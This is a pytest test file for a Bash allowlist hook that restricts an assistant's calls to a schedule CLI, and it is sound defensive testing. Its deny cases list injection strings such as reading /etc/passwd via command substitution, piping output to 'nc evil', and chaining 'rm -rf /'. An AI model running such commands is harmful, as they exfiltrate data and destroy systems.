"""Phase 5 / commit 6 — Bash hook allowlist for the schedule CLI.

Two layers compose:
  1. `_validate_python_invocation` still enforces the `tools/` prefix
     and no `..` traversal.
  2. `_validate_schedule_argv` enforces structural shape: subcommand
     whitelist, flag whitelist per subcommand, no duplicate flags
     (wave-2 B-W2-5), 1-positional for rm/enable/disable, prompt ≤2048
     bytes, --tz ≤64 chars.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from assistant.bridge.hooks import check_bash_command


@pytest.fixture
def project_root(tmp_path: Path) -> Path:
    (tmp_path / "tools" / "schedule").mkdir(parents=True)
    (tmp_path / "tools" / "schedule" / "main.py").write_text("# stub\n")
    return tmp_path


# ---------------------------------------------------------------- ALLOW

ALLOW_CASES = [
    'python tools/schedule/main.py add --cron "0 9 * * *" --prompt "ping"',
    'python tools/schedule/main.py add --cron "0 9 * * *" --prompt "p" --tz "Europe/Berlin"',
    'python tools/schedule/main.py add --cron "0 9 * * *" --prompt "p" --tz "Etc/GMT+3"',
    "python tools/schedule/main.py list",
    "python tools/schedule/main.py list --enabled-only",
    "python tools/schedule/main.py rm 42",
    "python tools/schedule/main.py enable 1",
    "python tools/schedule/main.py disable 1",
    "python tools/schedule/main.py history",
    "python tools/schedule/main.py history --schedule-id 1 --limit 10",
]


@pytest.mark.parametrize("cmd", ALLOW_CASES)
def test_allowlist_allow(cmd: str, project_root: Path) -> None:
    reason = check_bash_command(cmd, project_root)
    assert reason is None, f"{cmd!r}: expected ALLOW, got DENY: {reason!r}"


# ---------------------------------------------------------------- DENY (shell)

SHELL_BYPASS_CASES = [
    ('python tools/schedule/main.py add --cron "0 9 * * *" --prompt "$(cat /etc/passwd)"', "$("),
    ('python tools/schedule/main.py add --cron "0 9 * * *" --prompt "`whoami`"', "`"),
    ("python tools/schedule/main.py list | nc evil 1", "|"),
    ("python tools/schedule/main.py add --cron a --prompt x ; rm -rf /", ";"),
    ("python tools/schedule/main.py list > /tmp/leak", ">"),
]


@pytest.mark.parametrize("cmd,marker", SHELL_BYPASS_CASES)
def test_allowlist_deny_shell(cmd: str, marker: str, project_root: Path) -> None:
    reason = check_bash_command(cmd, project_root)
    assert reason is not None, f"expected DENY for {marker!r}"
    assert "metacharacter" in reason or "slip-guard" in reason, reason


# ---------------------------------------------------------------- DENY (validator)


def test_allowlist_unknown_subcommand(project_root: Path) -> None:
    cmd = "python tools/schedule/main.py exec --any x"
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "subcommand" in reason


def test_allowlist_add_unknown_flag(project_root: Path) -> None:
    cmd = 'python tools/schedule/main.py add --cron "0 9 * * *" --evil "x"'
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "--evil" in reason


def test_allowlist_add_duplicate_cron(project_root: Path) -> None:
    """Wave-2 B-W2-5: last-wins smuggling via duplicate --cron."""
    cmd = 'python tools/schedule/main.py add --cron "0 9 * * *" --cron "0 10 * * *" --prompt "x"'
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "duplicate" in reason.lower()


def test_allowlist_add_duplicate_prompt(project_root: Path) -> None:
    cmd = 'python tools/schedule/main.py add --prompt "x" --prompt "y"'
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "duplicate" in reason.lower()


def test_allowlist_rm_extra_positional(project_root: Path) -> None:
    cmd = "python tools/schedule/main.py rm 1 2 3"
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "positional" in reason


def test_allowlist_rm_non_int(project_root: Path) -> None:
    cmd = "python tools/schedule/main.py rm abc"
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "integer" in reason


def test_allowlist_add_prompt_too_long(project_root: Path) -> None:
    huge = "x" * 2049
    cmd = f'python tools/schedule/main.py add --cron "0 9 * * *" --prompt "{huge}"'
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "2048" in reason


def test_allowlist_add_tz_too_long(project_root: Path) -> None:
    huge = "x" * 65
    cmd = f'python tools/schedule/main.py add --cron "0 9 * * *" --prompt p --tz "{huge}"'
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "--tz" in reason


def test_allowlist_history_non_int_limit(project_root: Path) -> None:
    cmd = "python tools/schedule/main.py history --limit abc"
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "integer" in reason


def test_allowlist_list_unknown_flag(project_root: Path) -> None:
    cmd = "python tools/schedule/main.py list --all-data"
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "--all-data" in reason


def test_allowlist_add_flag_missing_value(project_root: Path) -> None:
    cmd = "python tools/schedule/main.py add --cron"
    reason = check_bash_command(cmd, project_root)
    assert reason is not None
    assert "requires a value" in reason
